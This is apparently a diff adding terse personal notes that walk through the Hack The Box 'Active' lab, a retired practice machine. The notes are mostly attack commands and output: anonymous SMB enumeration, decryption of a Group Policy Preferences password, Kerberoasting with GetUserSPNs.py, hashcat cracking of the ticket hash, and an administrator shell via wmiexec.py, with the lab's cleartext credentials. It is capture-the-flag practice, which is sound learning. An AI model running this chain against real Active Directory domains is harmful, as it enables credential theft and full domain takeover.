@@ -1,0 +1,22 @@
+//based on egre55
+smbclient -L 10.10.10.100 -N -L		//lists shares
+smbclient //10.10.10.100/Replication
+grep -Ri password
+	Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+active.htb\SVC_TGS : GPPstillStandingStrong2k18
+
+GetADUsers.py -all active/svc_tgs -dc-ip 10.10.10.100
+ldapsearch -x -h 10.10.10.100 -p 389 -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
+dn: CN=Administrator,CN=Users,DC=active,DC=htb
+//SPN: active/CIFS:445
+GetUserSPNs.py active.htb/svc_tgs -dc 10.10.10.100	//to get SPN also (alternative)
+GetUserSPNs.py active.htb/svc_tgs -dc 10.10.10.100 -request	//request TGS, got hash
+
+//got error: [-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) 
+ntpdate 10.10.10.100
+sudo date -s "01 Aug 2021 06:48:10"
+
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable
+Ticketmaster1968
+wmiexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
